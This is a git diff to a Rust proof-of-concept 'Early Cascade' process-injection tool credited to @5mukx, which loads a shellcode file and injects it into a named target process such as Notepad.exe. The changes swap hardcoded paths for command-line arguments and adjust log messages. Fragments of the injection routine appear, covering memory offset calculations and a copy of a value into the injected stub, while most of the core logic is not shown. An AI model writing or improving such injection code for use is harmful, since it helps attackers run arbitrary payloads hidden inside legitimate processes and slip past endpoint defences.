@@ -1,5 +1,7 @@
-extern crate winapi;
-extern crate ntapi;
+/*
+    EARLYCASCADE INJECTION PoC Rust
+    Author: @5mukx
+*/
 
 use std::ffi::CString;
 use std::ptr::null_mut;
@@ -92,19 +94,19 @@ fn main(){
         length: 0,
     };
 
-    // let args: Vec<String> = std::env::args().collect();
+    let args: Vec<String> = std::env::args().collect();
 
-    // if args.len() <= 2 {
-    //     println!("[-] Not enough arguments");
-    //     println!("[*] Example: {} [process.exe] [shellcode.bin]", args[0]);
-    //     std::process::exit(1);
-    // }
+    if args.len() <= 2 {
+        println!("[-] Not enough arguments");
+        println!("[*] Example: {} [process.exe] [shellcode.bin]", args[0]);
+        std::process::exit(1);
+    }
 
-    // let process = &args[1];
-    // let file_path = &args[2];
+    let process = &args[1];
+    let file_path = &args[2];
 
-    let process = "Notepad.exe".to_string();
-    let file_path = ".\\w64-exec-calc-shellcode.bin".to_string();
+    // let process = "Notepad.exe".to_string();
+    // let file_path = ".\\w64-exec-calc-shellcode.bin".to_string();
 
     unsafe{
 
@@ -148,6 +150,8 @@ fn main(){
 }
 
 unsafe fn cascade_inject(process: *const i8, payload: &Buffer, context: Option<&Buffer>) -> NTSTATUS {
+
+    println!();
     println!("--Cascade Injection Function--");
 
     #[allow(non_snake_case)]
@@ -288,7 +292,7 @@ unsafe fn cascade_inject(process: *const i8, payload: &Buffer, context: Option<&
     
 
     // -> Problem starts here ...!
-    println!("MEMORY IN usize: {}", memory as UINT_PTR);
+    println!("[+] MEMORY IN usize: {}", memory as UINT_PTR);
     g_value = (memory as usize) + CASCADE_STUB_X64.len();
 
     println!("[+] g_Value: {:?}", g_value);
@@ -319,8 +323,8 @@ unsafe fn cascade_inject(process: *const i8, payload: &Buffer, context: Option<&
     g_value = (memory as usize) + std::mem::size_of_val(&CASCADE_STUB_X64) + payload.length;
 
 
-    println!("Payload.length: {}", payload.length);
-    println!("New g_Value: {}", g_value);
+    println!("[+] Payload.length: {}", payload.length);
+    println!("[+] New g_Value: {}", g_value);
 
     std::ptr::copy_nonoverlapping(
         &g_value as *const usize as *const u8,
@@ -492,7 +496,9 @@ unsafe fn cascade_inject(process: *const i8, payload: &Buffer, context: Option<&
 }
 
 unsafe fn file_read(file_name: &str, buffer: &mut Buffer) -> bool {
+    println!();
     println!("--File Read Execution--");
+
 
     let mut bytes_read: DWORD = 0;
     // let mut success:bool = false;
